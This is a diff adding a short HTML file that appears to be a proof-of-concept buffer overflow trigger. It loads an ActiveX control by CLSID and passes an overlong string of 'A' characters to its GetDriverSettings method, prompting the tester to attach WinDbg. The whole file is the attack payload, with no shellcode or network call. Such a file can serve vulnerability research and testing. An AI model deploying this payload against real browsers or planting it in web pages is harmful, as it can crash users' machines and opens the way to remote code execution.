@@ -1,0 +1,17 @@
+<html>
+  <object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C' id='target'>
+  </object>
+  <script >
+
+    ret='';
+    for (counter=0; counter<=1000; counter++) ret += "A";
+    arg1 = 'printer';
+    arg2 = 'realm';
+    arg3 = 'user';
+    arg4 = 'pass';
+	
+    alert("Attach WinDbg!");
+	
+    target.GetDriverSettings(ret,arg2,arg3,arg4);
+  </script>
+</html>
